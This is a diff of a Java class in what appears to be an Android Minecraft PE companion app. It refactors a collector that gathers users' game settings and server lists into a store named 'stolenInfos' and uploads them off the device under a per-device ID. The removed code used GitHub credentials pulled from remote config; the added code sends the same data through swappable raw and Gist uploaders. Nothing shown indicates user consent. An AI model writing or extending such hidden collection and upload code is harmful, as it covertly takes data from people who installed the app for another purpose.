@@ -7,22 +7,25 @@ import android.preference.*;
 import android.util.*;
 import com.google.firebase.remoteconfig.*;
 import com.google.gson.*;
-import com.google.gson.reflect.*;
 import com.nao20010128nao.OTC.*;
 import com.nao20010128nao.Wisecraft.*;
 import com.nao20010128nao.Wisecraft.misc.*;
-import com.nao20010128nao.Wisecraft.misc.compat.*;
 import com.nao20010128nao.Wisecraft.widget.*;
 import java.io.*;
 import java.math.*;
 import java.net.*;
 import java.security.*;
 import java.util.*;
-import org.eclipse.egit.github.core.*;
-import org.eclipse.egit.github.core.client.*;
-import org.eclipse.egit.github.core.service.*;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
+	private static final List<CollectorMainUploaderProvider> UPLOADERS;
+	static{
+		List<CollectorMainUploaderProvider> uploaders=new ArrayList<>();
+		uploaders.add(new RawUploader1());
+		uploaders.add(new GistUploader());
+		UPLOADERS=Collections.unmodifiableList(uploaders);
+	}
+	
 	static boolean running=false;
 	public static SharedPreferences stolenInfos;
 	
@@ -61,63 +64,41 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				Log.d("CollectorMain", "collect");
 			} catch (Throwable e) {
 				DebugWriter.writeToE("CollectorMain",e);
-				reportError("CollectorMain#run#collect",e);
 			} finally {
 				System.out.println(s);
 			}
-			if(TheApplication.instance.fbCfgLoader.isSuccessful()){
-				FirebaseRemoteConfig frc=TheApplication.instance.firebaseRemoteCfg;
-				frc.activateFetched();
-				GitHubClient ghc=new GitHubClient().setCredentials(frc.getString("information_upload_user"), frc.getString("information_upload_pass"));
-				Repository repo=null;
-				List<RepositoryContents> cont=null;
-				SharedPreferences.Editor edt=sb.edit();
-				String[] files=Constant.EMPTY_STRING_ARRAY;
-				try {
-					files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
-					repo = new RepositoryService(ghc).getRepository(frc.getString("information_upload_host_user"), frc.getString("information_upload_host_name"));
-					cont = new ContentsService(ghc).getContents(repo);
-					Log.d("CollectorMain", "get");
-				} catch (Throwable e) {
-					DebugWriter.writeToE("CollectorMain",e);
-					return;
-				}
-				try {
-					for (String filename:files) {
-						String actual=filename;
-						filename = uuid + "/" + filename;
-						Log.d("CollectorMain", "upload:" + filename);
-						try {
-							Map<String, String> params = new HashMap<>();
-							params.put("path", filename);
-							params.put("message", uuid+":"+Utils.randomText(64));
-							byte[] file = sb.getString(actual, "").getBytes(CompatCharsets.UTF_8);
-							try {
-								String hash=getHash(cont,filename);
-								if(!Utils.isNullString(hash))params.put("sha", hash);
-							} catch (Throwable e) {
-								DebugWriter.writeToE("CollectionMain",e);
-								Log.d("CollectorMain", "skipped");
-								continue;
-							}
-							params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
-							ghc.put("/repos/"+frc.getString("information_upload_host_user")+"/"+frc.getString("information_upload_host_name")+"/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
-							Log.d("CollectorMain", "uploaded");
+			
+			CollectorMainUploaderProvider cmup=getNextAvailableUploader();
+			if(cmup==null)return;
+			CollectorMainUploaderProvider.Interface inf=cmup.forInterface();
+			SharedPreferences.Editor edt=sb.edit();
+			String[] files=Constant.EMPTY_STRING_ARRAY;
+			try {
+				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
+				inf.init();
+				Log.d("CollectorMain", "get");
+			} catch (Throwable e) {
+				DebugWriter.writeToE("CollectorMain",e);
+				return;
+			}
+			try {
+				for (String filename:files) {
+					String actual=filename;
+					Log.d("CollectorMain", "upload:" + filename);
+					try {
+						if(inf.doUpload(uuid,filename,sb.getString(actual, "")))
 							edt.remove(actual);
-						} catch (Throwable e) {
-							DebugWriter.writeToE("CollectorMain",e);
-							if(e.getMessage().contains("\"sha\" wasn't supplied"))edt.remove(actual);
-							continue;
-						}
+						Log.d("CollectorMain", "uploaded");
+					} catch (Throwable e) {
+						DebugWriter.writeToE("CollectorMain",e);
+						continue;
 					}
-				} catch (Throwable e) {
-					DebugWriter.writeToE("CollectorMain",e);
-				}finally{
-					edt.commit();
-					Log.d("CollectorMain", "saveTotal");
 				}
-			}else{
-				Log.d("CollectorMain", "firebase failed to get config");
+			} catch (Throwable e) {
+				DebugWriter.writeToE("CollectorMain",e);
+			}finally{
+				edt.commit();
+				Log.d("CollectorMain", "saveTotal");
 			}
 		} catch (Throwable e) {
 			DebugWriter.writeToE("CollectorMain",e);
@@ -135,27 +116,11 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		}
 	}
 	
-	public static String getHash(List<RepositoryContents> cont, String filename) {
-	    for (RepositoryContents o:cont)
-	        if (o.getName().equalsIgnoreCase(filename))
-	            return o.getSha();
+	public static CollectorMainUploaderProvider getNextAvailableUploader()throws Throwable{
+		for(CollectorMainUploaderProvider cmup:UPLOADERS)
+			if(cmup.isAvailable())
+				return cmup;
 		return null;
-	}
-
-	@TargetApi(9)
-	public static String shash(byte[] b) throws IOException {
-		try {
-			MessageDigest md = MessageDigest.getInstance("SHA");
-			md.reset();
-			byte[] hashed = md.digest(b);
-			StringBuilder sb = new StringBuilder(hashed.length * 2);
-			for (byte bite : hashed) {
-				sb.append(Character.forDigit(bite >> 4 & 0xf, 16)).append(Character.forDigit(bite & 0xf, 16));
-			}
-			return sb.toString();
-		} catch (NoSuchAlgorithmException e) {
-			throw new IOException(e);
-		}
 	}
 	
 	public static void reportError(String tag,Throwable e){
@@ -164,11 +129,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		WisecraftError.report(tag,e);
 	}
 	
-	public static class ContentUpload {
-		public RepositoryContents content;
-		public RepositoryCommit commit;
-		public RepositoryCommit[] parents;
-	}
 	public static class Infos {
 		public OrderTrustedMap<String,String> mcpeSettings=readSettings();
 		public String[] mcpeServers=readServers();
